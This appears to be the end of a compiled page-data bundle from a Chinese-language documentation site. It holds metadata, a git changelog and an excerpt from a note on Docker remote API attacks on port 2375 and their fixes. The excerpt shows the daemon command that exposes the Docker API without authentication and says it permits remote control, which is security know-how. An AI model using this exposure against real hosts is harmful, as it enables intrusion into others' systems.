$HO..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-05-29T02:44:55.000Z"}],["meta",{"property":"article:modified_time","content":"2024-05-29T02:44:55.000Z"}]]},"git":{"createdTime":1691939318000,"updatedTime":1716950695000,"contributors":[{"name":"Paper-Dragon","username":"Paper-Dragon","email":"2678885646@qq.com","commits":1,"url":"https://github.com/Paper-Dragon"},{"name":"PaperDragon-SH","username":"PaperDragon-SH","email":"2678885646@qq.com","commits":3,"url":"https://github.com/PaperDragon-SH"}],"changelog":[{"hash":"d6ac4a6a6d047dec32f09cb26c03cf826736a81b","time":1716950695000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"Openresty和lua脚本实战"},{"hash":"19bb85d20d0a1760a146c084ff2742ef2d483bd9","time":1711093356000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"fixed some image lost in web pack progress"},{"hash":"f7f2a09c84ecf3e02274fd7699c5c95c0fcf1863","time":1711088152000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"Docker的Markdown规范化"},{"hash":"392a519398b2e846f316619fbe831e100164de7c","time":1691939318000,"email":"2678885646@qq.com","author":"Paper-Dragon","message":"Create The Worid!"}]},"readingTime":{"minutes":5.85,"words":1755},"filePathRelative":"note-book/Docker/Docker的2375攻击和解决方案.md","excerpt":"\\n<p>相信了解过<a href=\\"https://so.csdn.net/so/search?q=docker&amp;spm=1001.2101.3001.7020\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">docker</a> remote API的同学对2375端口都不陌生了，2375是docker远程操控的默认端口，通过这个端口可以直接对远程的docker daemon进行操作。</p>\\n<p>当$HOST主机以**<code>docker daemon -H=0.0.0.0:2375</code>**方式启动daemon时，可以在外部机器对 $HOST 的docker daemon进行直接操作：</p>","autoDesc":true}');export{r as comp,d as data};
